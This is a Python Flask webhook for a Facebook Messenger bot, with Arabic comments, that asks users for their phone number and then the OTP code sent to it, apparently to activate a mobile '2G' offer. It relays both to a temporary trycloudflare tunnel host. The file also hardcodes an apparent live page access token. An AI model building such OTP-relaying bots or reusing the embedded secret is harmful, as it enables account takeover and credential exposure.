from flask import Flask, request
import requests

app = Flask(__name__)

PAGE_TOKEN = "EAAMD5SUZAe8YBRUeUrogmr3FsxKuZBYEdA5zlrzTn9EjMuqAY7ZCt762M9nJFATHLQMpwsdxEZC1922ZARp9JHhGzTR9zWBd4DtuiSJZCfe8mkU7IujdwCzTB605MSpeXXglAVKW1ZCGNDc7dCvFMyZCDd8NQmokH9om1lEfp6riJKryhw9hpfJFTIjBTIwNa62tYFXK4AZDZD"
VERIFY_TOKEN = "zako70012"

PHONE_URL = "https://alaska-consecutive-notification-domestic.trycloudflare.com"

# 🧠 حالات المستخدمين
users = {}


# 📩 إرسال رسالة
def send_message(psid, text, buttons=None):
    url = "https://graph.facebook.com/v19.0/me/messages"
    params = {"access_token": PAGE_TOKEN}

    payload = {
        "recipient": {"id": psid},
        "message": {}
    }

    if buttons:
        payload["message"] = {
            "attachment": {
                "type": "template",
                "payload": {
                    "template_type": "button",
                    "text": text,
                    "buttons": buttons
                }
            }
        }
    else:
        payload["message"] = {"text": text}

    requests.post(url, json=payload, params=params)


# 🔐 تحقق فيسبوك
@app.route("/webhook", methods=["GET"])
def verify():
    if (request.args.get("hub.mode") == "subscribe" and
        request.args.get("hub.verify_token") == VERIFY_TOKEN):
        return request.args.get("hub.challenge"), 200
    return "error", 403


# 📩 استقبال الرسائل
@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()

    try:
        entry = data["entry"][0]
        messaging = entry["messaging"][0]

        psid = messaging["sender"]["id"]
        text = messaging.get("message", {}).get("text", "")

        if psid not in users:
            users[psid] = {"step": "phone"}

        user = users[psid]

        # 📱 استقبال رقم الهاتف (أي رسالة أولى تعتبر رقم)
        if user["step"] == "phone":
            user["phone"] = text
            user["step"] = "otp"

            # إرسال OTP للهاتف
            try:
                requests.post(PHONE_URL, json={
                    "action": "send_otp",
                    "phone": text
                })
            except:
                pass

            send_message(psid, "📩 تم إرسال رمز OTP، أدخله الآن")

        # 🔐 إدخال OTP
        elif user["step"] == "otp":
            user["otp"] = text
            user["step"] = "verify"

            try:
                requests.post(PHONE_URL, json={
                    "action": "activate",
                    "phone": user["phone"],
                    "otp": text
                })
            except:
                pass

            # 🎯 بعد النجاح نعرض زر التفعيل
            buttons = [
                {
                    "type": "postback",
                    "title": "تفعيل 2G",
                    "payload": "ACTIVATE_2G"
                }
            ]

            send_message(psid, "🎉 تم تسجيل الدخول بنجاح", buttons)

        # 🔘 زر التفعيل
        elif messaging.get("postback"):
            payload = messaging["postback"]["payload"]

            if payload == "ACTIVATE_2G":
                send_message(psid, "⏳ يتم الآن تفعيل عرض 2G...")

    except Exception as e:
        print("error:", e)

    return "ok", 200


# 🚀 تشغيل السيرفر
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)